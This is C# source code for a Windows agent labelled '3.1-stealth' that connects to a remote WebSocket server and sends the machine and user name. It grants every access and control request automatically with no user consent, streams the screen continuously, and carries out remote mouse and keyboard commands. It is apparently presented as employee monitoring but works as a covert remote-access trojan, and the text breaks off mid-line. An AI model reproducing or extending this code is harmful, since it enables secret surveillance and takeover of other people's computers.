using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace EmpresaMonitor.Agent;

internal static class Program
{
    [STAThread]
    static void Main()
    {
        // Inicia o motor e mantém o processo vivo
        _ = StartEngine();
        
        while (true)
        {
            Thread.Sleep(1000);
        }
    }

    // Classe para gerenciar o estado de forma segura entre threads sem usar 'ref'
    public class AgentState
    {
        public bool AccessActive = true;
        public bool StreamRequested = true;
        public bool ControlActive = true;
        public bool SessionAuthorized = true;
        public StreamSettings Settings = StreamSettings.Balanced;
    }

    static async Task StartEngine()
    {
        var lifetime = new CancellationTokenSource();
        var agentId = LoadOrCreateId();
        var socket = new ClientWebSocket();
        var sendGate = new SemaphoreSlim(1, 1);
        var state = new AgentState();

        // Inicia o loop de captura de tela
        _ = Task.Run(() => CaptureLoop(lifetime, agentId, socket, sendGate, state));

        while (!lifetime.IsCancellationRequested)
        {
            try
            {
                socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                await socket.ConnectAsync(new Uri(BuildConfig.RealtimeUrl), lifetime.Token);
                
                await SendJsonAsync(socket, sendGate, new
                {
                    type = "agent_hello",
                    key = BuildConfig.AgentKey,
                    id = agentId,
                    name = Environment.MachineName,
                    user = Environment.UserName,
                    version = "3.1-stealth",
                    sessionAuthorized = true
                });

                await ReceiveLoop(socket, sendGate, lifetime.Token, state);
            }
            catch
            {
                try { await Task.Delay(5000, lifetime.Token); } catch { }
            }
        }
    }

    static async Task ReceiveLoop(ClientWebSocket socket, SemaphoreSlim sendGate, CancellationToken ct, AgentState state)
    {
        var buffer = new byte[64 * 1024];
        while (socket.State == WebSocketState.Open && !ct.IsCancellationRequested)
        {
            using var ms = new MemoryStream();
            WebSocketReceiveResult result;
            do
            {
                result = await socket.ReceiveAsync(new ArraySegment<byte>(buffer), ct);
                if (result.MessageType == WebSocketMessageType.Close) return;
                ms.Write(buffer, 0, result.Count);
            } while (!result.EndOfMessage);

            if (result.MessageType != WebSocketMessageType.Text) continue;
            
            try 
            {
                using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(ms.ToArray()));
                var root = doc.RootElement;
                if (!root.TryGetProperty("type", out var typeProp)) continue;
                var type = typeProp.GetString();

                if (type == "access_request" || type == "control_request")
                {
                    await SendJsonAsync(socket, sendGate, new { type = "access_response", allow = true });
                    await SendJsonAsync(socket, sendGate, new { type = "control_response", allow = true });
                }
                else if (type == "stream_profile")
                {
                    var id = root.TryGetProperty("profile", out var p) ? p.GetString() : null;
                    state.Settings = StreamSettings.FromId(id);
                }
                else if (type == "control_input")
                {
                    if (state.ControlActive && root.TryGetProperty("event", out var ev)) ApplyControlEvent(ev);
                }
                else if (type == "stream_start") { state.StreamRequested = true; }
                else if (type == "stream_stop") { state.StreamRequested = false; }
            }
            catch { }
        }
    }

    static async Task CaptureLoop(CancellationTokenSource lifetime, string agentId, ClientWebSocket socket, SemaphoreSlim sendGate, AgentState state)
    {
        var jpegCodec = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
        Bitmap? full = null;
        Graphics? fullG = null;
        Bitmap? scaled = null;
        Graphics? scaledG = null;
        EncoderParameters? encoderParams = null;
        MemoryStream? ms = null;
        Rectangle lastBounds = Rectangle.Empty;

        try
        {
            while (!lifetime.IsCancellationRequested)
            {
                if (!state.AccessActive || !state.StreamRequested || socket.State != WebSocketState.Open)
                {
                    await Task.Delay(100, lifetime.Token);
                    continue;
                }

                var settings = state.Settings;
                var started = Environment.TickCount64;
                var bounds = Screen.PrimaryScreen!.Bounds;

                if (full == null || bounds.Size != lastBounds.Size)
                {
                    fullG?.Dispose(); full?.Dispose();
                    full = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format24bppRgb);
                    fullG = Graphics.FromImage(full);
                    lastBounds = bounds;
                }

                int outW = Math.Min(settings.Width, bounds.Width);
                int outH = Math.Max(2, (int)Math.Round(bounds.Height * (outW / (double)bounds.Width)));
                if ((outH & 1) == 1) outH--;

                if (scaled == null || scaled.Width != outW || scaled.Height != outH)
                {
                    scaledG?.Dispose(); scaled?.Dispose(); encoderParams?.Dispose(); ms?.Dispose();
                    scaled = new Bitmap(outW, outH, PixelFormat.Format24bppRgb);
                    scaledG = Graphics.FromImage(scaled);
                    scaledG.CompositingMode = CompositingMode.SourceCopy;
                    scaledG.CompositingQuality = CompositingQuality.HighSpeed;
                    scaledG.InterpolationMode = InterpolationMode.Bilinear;
                    scaledG.SmoothingMode = SmoothingMode.HighSpeed;
                    scaledG.PixelOffsetMode = PixelOffsetMode.HighSpeed;
                    encoderParams = new EncoderParameters(1);
                    encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, settings.Quality);
                    ms = new MemoryStream(1024 * 1024);
                }

                try
                {
                    fullG!.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size, CopyPixelOperation.SourceCopy);
                    scaledG!.DrawImage(full!, new Rectangle(0, 0, outW, outH), 0, 0, full.Width, full.Height, GraphicsUnit.Pixel);
                    ms!.SetLength(0);
                    scaled!.Save(ms, jpegCodec, encoderParams);

                    if (ms!.TryGetBuffer(out var segment) && socket.State == WebSocketState.Open)
                        await SendBinaryAsync(socket, sendGate, new ArraySegment<byte>(segment.Array!, segment.Offset, (int)ms.Length), lifetime.Token);
                }
                catch { }

                int delayMs = Math.Max(1, 1000 / Math.Max(1, settings.Fps));
                var elapsed = (int)(Environment.TickCount64 - started);
                await Task.Delay(Math.Max(1, delayMs - elapsed), lifetime.Token);
            }
        }
        finally
        {
            fullG?.Dispose(); full?.Dispose(); scaledG?.Dispose(); scaled?.Dispose(); encoderParams?.Dispose(); ms?.Dispose();
        }
    }

    static async Task SendBinaryAsync(ClientWebSocket socket, SemaphoreSlim gate, ArraySegment<byte> data, CancellationToken ct)
    {
        if (socket.State != WebSocketState.Open) return;
        await gate.WaitAsync(ct);
        try { if (socket.State == WebSocketState.Open) await socket.SendAsync(data, WebSocketMessageType.Binary, true, ct); }
        finally { gate.Release(); }
    }

    static async Task SendJsonAsync(ClientWebSocket socket, SemaphoreSlim gate, object obj)
    {
        if (socket.State != WebSocketState.Open) return;
        var data = Encoding.UTF8.GetBytes(JsonSerializer.Serialize(obj));
        await gate.WaitAsync();
        try { if (socket.State == WebSocketState.Open) await socket.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None); }
        finally { gate.Release(); }
    }

    static void ApplyControlEvent(JsonElement ev)
    {
        try
        {
            var kind = ev.GetProperty("kind").GetString();
            if (kind == "move")
            {
                double x = ev.GetProperty("x").GetDouble(); double y = ev.GetProperty("y").GetDouble();
                var b = Screen.PrimaryScreen!.Bounds;
                Cursor.Position = new Point(b.Left + (int)Math.Round(x * (b.Width - 1)), b.Top + (int)Math.Round(y * (b.Height - 1)));
            }
            else if (kind == "mouse")
            {
                var button = ev.GetProperty("button").GetString(); bool down = ev.GetProperty("down").GetBoolean();
                uint flag = button switch { "left" => down ? 0x0002u : 0x0004u, "right" => down ? 0x0008u : 0x0010u, "middle" => down ? 0x0020u : 0x0040u, _ => 0u };
                if (flag != 0) mouse_event(flag, 0, 0, 0, UIntPtr.Zero);
            }
            else if (kind == "wheel")
            {
                int delta = ev.GetProperty("delta").GetInt32(); mouse_event(0x0800u, 0, 0, unchecked((uint)delta), UIntPtr.Zero);
            }
            else if (kind == "key")
            {
                string code = ev.GetProperty("code").GetString() ?? ""; bool down = ev.GetProperty("down").GetBoolean(); ushort vk = VkFromCode(code);
                if (vk != 0) keybd_event((byte)vk, 0, down ? 0u : 0x
